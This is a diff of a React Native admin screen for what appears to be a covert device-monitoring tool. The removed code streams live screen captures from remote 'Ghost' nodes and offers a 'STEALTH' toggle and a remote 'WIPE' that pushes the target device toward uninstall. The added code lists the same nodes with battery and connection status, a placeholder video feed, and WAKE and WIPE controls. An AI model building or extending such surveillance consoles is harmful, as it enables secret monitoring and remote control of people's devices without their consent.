@@ -1,119 +1,58 @@
 import React, { useState, useEffect } from 'react';
-import { View, Text, Image, TouchableOpacity, StyleSheet, Alert, Dimensions } from 'react-native';
+import { View, Text, StyleSheet, ScrollView, TouchableOpacity } from 'react-native';
+import socket from '../services/socket';
 
-const { width } = Dimensions.get('window');
+const AdminScreen = () => {
+  const [ghosts, setGhosts] = useState({});
 
-export default function AdminScreen({ socket, user, onExit }) {
-    const [feed, setFeed] = useState(null);
-    const [isOffline, setIsOffline] = useState(false);
-    const [statusMsg, setStatusMsg] = useState("AWAITING HD SIGNAL...");
+  useEffect(() => {
+    // Listen for the heartbeat updates from the Ghost
+    socket.on('heartbeat_update', (data) => {
+      setGhosts(prev => ({ ...prev, [data.name]: data }));
+    });
+  }, []);
 
-    useEffect(() => {
-        // --- HIGH-QUALITY FRAME RECEIVER ---
-        socket.on('screen_frame', (data) => {
-            // data: { ghostName: "Alpha_01", frame: "base64..." }
-            setFeed(`data:image/jpeg;base64,${data.frame}`);
-            setStatusMsg(`LIVE: ${data.ghostName.toUpperCase()}`);
-        });
-
-        socket.on('system_alert', (data) => {
-            Alert.alert("System", data.msg);
-        });
-
-        return () => {
-            socket.off('screen_frame');
-            socket.off('system_alert');
-        };
-    }, []);
-
-    const toggleVisibility = () => {
-        const nextState = !isOffline;
-        setIsOffline(nextState);
-        socket.emit('toggle_visibility', { hidden: nextState });
-    };
-
-    const confirmExit = () => {
-        Alert.alert("Terminate Session", "Disconnect from Joyjet Hub?", [
-            { text: "Stay", style: "cancel" },
-            { text: "Logout", onPress: onExit }
-        ]);
-    };
-
-    const triggerWipe = () => {
-        Alert.alert("DANGER", "This will force the target node to open settings for uninstallation. Proceed?", [
-            { text: "Cancel" },
-            { text: "WIPE NODE", onPress: () => socket.emit('admin_wipe', 'GLOBAL_BROADCAST'), style: 'destructive' }
-        ]);
-    };
-
-    return (
-        <View style={styles.container}>
-            {/* --- HEADER: Identity & Status --- */}
-            <View style={styles.header}>
-                <View>
-                    <Text style={styles.roleTag}>{user.role}</Text>
-                    <Text style={styles.nameTag}>{user.name.toUpperCase()}</Text>
-                </View>
-                
-                <TouchableOpacity 
-                    style={[styles.statusBadge, { backgroundColor: isOffline ? '#333' : '#00ffcc' }]} 
-                    onPress={toggleVisibility}
-                >
-                    <Text style={styles.statusLabel}>{isOffline ? "STEALTH" : "LIVE HUB"}</Text>
-                </TouchableOpacity>
+  return (
+    <View style={styles.container}>
+      <Text style={styles.title}>LIVE GHOST NODES</Text>
+      <ScrollView>
+        {Object.values(ghosts).map((ghost) => (
+          <View key={ghost.name} style={styles.nodeCard}>
+            {/* The New Status Bar */}
+            <View style={styles.statusBar}>
+              <Text style={styles.nodeName}>{ghost.name}</Text>
+              <Text style={styles.statText}>🔋 {ghost.battery} {ghost.isCharging ? '⚡' : ''}</Text>
+              <Text style={styles.statText}>📶 {ghost.connection}</Text>
+            </View>
+            
+            {/* HD Video Placeholder */}
+            <View style={styles.videoWindow}>
+              <Text style={styles.placeholderText}>RECEIVING HD STREAM...</Text>
             </View>
 
-            {/* --- MONITOR: HD Video Feed --- */}
-            <View style={styles.monitorFrame}>
-                {feed ? (
-                    <Image 
-                        source={{ uri: feed }} 
-                        style={styles.liveImage} 
-                        fadeDuration={0} // Critical: Removes lag between frames
-                    />
-                ) : (
-                    <View style={styles.noSignal}>
-                        <Text style={styles.noSignalText}>{statusMsg}</Text>
-                    </View>
-                )}
+            <View style={styles.controls}>
+              <TouchableOpacity style={styles.btn}><Text style={styles.btnText}>WAKE</Text></TouchableOpacity>
+              <TouchableOpacity style={[styles.btn, {backgroundColor: '#440000'}]}><Text style={styles.btnText}>WIPE</Text></TouchableOpacity>
             </View>
-
-            {/* --- FOOTER: Controls & Exit --- */}
-            <View style={styles.footer}>
-                <View style={styles.commandRow}>
-                    {user.role === 'ADMIN' ? (
-                        <TouchableOpacity style={styles.wipeBtn} onPress={triggerWipe}>
-                            <Text style={styles.wipeText}>REMOTE WIPE</Text>
-                        </TouchableOpacity>
-                    ) : (
-                        <Text style={styles.viewerHint}>Monitoring assigned child-nodes only</Text>
-                    )}
-                </View>
-
-                <TouchableOpacity style={styles.logoutBtn} onPress={confirmExit}>
-                    <Text style={styles.logoutText}>TERMINATE LINK</Text>
-                </TouchableOpacity>
-            </View>
-        </View>
-    );
-}
+          </View>
+        ))}
+      </ScrollView>
+    </View>
+  );
+};
 
 const styles = StyleSheet.create({
-    container: { flex: 1, backgroundColor: '#000' },
-    header: { paddingHorizontal: 30, paddingTop: 60, paddingBottom: 20, flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', borderBottomWidth: 1, borderColor: '#111' },
-    roleTag: { color: '#444', fontSize: 9, fontWeight: 'bold', letterSpacing: 2 },
-    nameTag: { color: '#fff', fontSize: 16, fontWeight: 'bold', marginTop: 2 },
-    statusBadge: { paddingHorizontal: 12, paddingVertical: 5, borderRadius: 3 },
-    statusLabel: { color: '#000', fontSize: 10, fontWeight: 'bold' },
-    monitorFrame: { flex: 1, backgroundColor: '#050505', justifyContent: 'center', alignItems: 'center' },
-    liveImage: { width: width, height: '100%', resizeMode: 'contain' },
-    noSignal: { alignItems: 'center' },
-    noSignalText: { color: '#1a1a1a', fontSize: 12, fontWeight: 'bold', letterSpacing: 1 },
-    footer: { padding: 30, borderTopWidth: 1, borderColor: '#111' },
-    commandRow: { marginBottom: 25, alignItems: 'center' },
-    wipeBtn: { borderWidth: 1, borderColor: '#ff0033', paddingVertical: 10, paddingHorizontal: 40, borderRadius: 5 },
-    wipeText: { color: '#ff0033', fontSize: 10, fontWeight: 'bold', letterSpacing: 1 },
-    viewerHint: { color: '#222', fontSize: 9, fontStyle: 'italic' },
-    logoutBtn: { alignSelf: 'center', padding: 10 },
-    logoutText: { color: '#555', fontSize: 12, fontWeight: 'bold', letterSpacing: 1 }
+  container: { flex: 1, backgroundColor: '#121212', padding: 20 },
+  title: { color: '#fff', fontSize: 22, fontWeight: 'bold', marginTop: 40, marginBottom: 20 },
+  nodeCard: { backgroundColor: '#1e1e1e', borderRadius: 12, marginBottom: 20, overflow: 'hidden' },
+  statusBar: { flexDirection: 'row', justifyContent: 'space-between', padding: 10, backgroundColor: '#2a2a2a' },
+  nodeName: { color: '#00ff00', fontWeight: 'bold' },
+  statText: { color: '#ccc', fontSize: 12 },
+  videoWindow: { width: '100%', height: 200, backgroundColor: '#000', justifyContent: 'center', alignItems: 'center' },
+  placeholderText: { color: '#333', fontSize: 12 },
+  controls: { flexDirection: 'row', padding: 10, justifyContent: 'space-around' },
+  btn: { padding: 8, backgroundColor: '#333', borderRadius: 5, width: '45%', alignItems: 'center' },
+  btnText: { color: '#fff', fontSize: 12, fontWeight: 'bold' }
 });
+
+export default AdminScreen;
